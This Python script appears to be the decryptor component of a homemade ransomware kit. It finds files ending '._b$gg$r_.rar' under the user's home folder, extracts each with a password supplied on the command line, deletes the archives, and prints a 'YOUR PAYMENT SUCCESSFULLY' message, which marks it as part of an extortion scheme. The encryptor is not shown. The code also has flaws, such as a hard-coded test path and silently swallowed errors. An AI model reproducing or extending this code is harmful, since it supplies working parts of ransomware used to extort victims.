import os
import pyminizip
from requests import get
from subprocess import check_output
import getmac
from datetime import datetime
from datetime import date
import winsound
import sys
import getopt

def Extract_Winr(password):

    sysRoot = os.path.expanduser('~')
    root_locat = r'D:\Test\Test'
    list_file_ext = '*._b$gg$r_.rar'

    try:
        cmd = check_output(r'cd /d ' + sysRoot + ' && dir /S /B ' + list_file_ext, shell = True).decode('utf-8',errors='ignore').split('\n')
    except:
        pass

    try: 
        for i in cmd:
            
            i = i[:-1]
            #print(i)

            file_path = os.path.join(root_locat, i)
            dir_file_input = str(file_path)
                
            name_file = os.path.basename(file_path)

            dir_file_output = str(file_path).replace(name_file, '')

            try:
                pyminizip.uncompress(dir_file_input, password, dir_file_output, 0)
                os.remove(i)
            except:
                pass

            print('[*] File Decrypted: '+ file_path)
            
    except:
        pass

    print('\n[***] YOUR PAYMENT SUCCESSFULLY [***]')
    frequency = 2500 # Set Frequency To 2500Hz
    duration = 1000 # Set Duration To 1000 ms (1s)
    winsound.Beep(frequency, duration)


def Get_Input():

    password = None

    argv = sys.argv[1:]

    try:
        opts, args = getopt.getopt(argv, 'p:')
    except:
        print('Error')

    for opt, arg in opts:
        if opt in ['-p']:
            password = arg

    return password

password = Get_Input()
Extract_Winr(password)
